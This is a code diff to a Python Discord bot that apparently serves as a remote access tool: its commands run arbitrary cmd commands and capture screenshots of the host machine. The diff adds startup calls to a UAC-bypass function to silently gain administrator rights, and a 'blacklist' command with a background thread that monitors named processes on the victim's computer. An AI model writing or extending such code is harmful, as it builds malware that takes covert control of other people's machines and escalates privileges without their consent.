@@ -11,6 +11,7 @@ from interactions import OptionType, slash_option
 from interactions import Client, Intents, listen
 from interactions import ChannelType, File
 import os
+import threading
 #my imports
 from modules import basic_functions as functions
 #local settings
@@ -26,7 +27,12 @@ bot = Client(intents=Intents.DEFAULT)
 #-----------------------------------------------------------------------------------------------------------------------------------
 # on ready
 #-----------------------------------------------------------------------------------------------------------------------------------
-
+print(f'is admin: {functions.IsAdmin()}')
+if not(functions.IsAdmin()):
+    functions.UACbypass(1)
+    if not(functions.IsAdmin()):
+        functions.UACbypass(2)
+print(f'is admin: {functions.IsAdmin()}')
 @listen()
 async def on_ready():
     category_name = functions.category_name()
@@ -56,7 +62,7 @@ async def on_ready():
 # slash commands
 #-----------------------------------------------------------------------------------------------------------------------------------
 
-#cmd slash command
+#cmd command
 @slash_command(
     name="cmd",
     description="execute a cmd command",
@@ -170,5 +176,46 @@ async def screenshot(ctx: SlashContext):
     await ctx.send(file=File(f'{os.getcwd()}/sc.png'))
     #remove sc
     os.remove(f'{os.getcwd()}/sc.png')
+#blacklist
+@slash_command(
+    name="blacklist",
+    description="blacklist programms",
+)
+@slash_option(
+    name="add",
+    description="True=add False=remove blacklist",
+    required=True,
+    opt_type=OptionType.BOOLEAN,
+)
+@slash_option(
+    name="name",
+    description="name off process",
+    required=True,
+    opt_type=OptionType.STRING,
+)
+async def blacklist(ctx: SlashContext, add: bool, name: str):
+    # load all channel ids
+    config_custom = functions.get_ids()
+    # load channel id
+    channel = bot.get_channel(ctx.channel_id)
+    # check category
+    if channel.parent_id != config_custom["category_id"]:
+        return
+    # check if channel == main
+    if ctx.channel_id != config_custom["main_channel_id"]:
+        await ctx.send("blacklist can only be executed in main.")
+        return
+    if (add == True):
+        output = functions.add_blacklist(name)
+    else:
+        output = functions.remove_blacklist(name)
+    await ctx.send(output)
+#-----------------------------------------------------------------------------------------------------------------------------------
+# start everything
+#-----------------------------------------------------------------------------------------------------------------------------------
+
+# start blacklist thread
+monitoring_thread = threading.Thread(target=functions.monitor_blacklisted_programs)
+monitoring_thread.start()
 #start bot
 bot.start(config["token"])
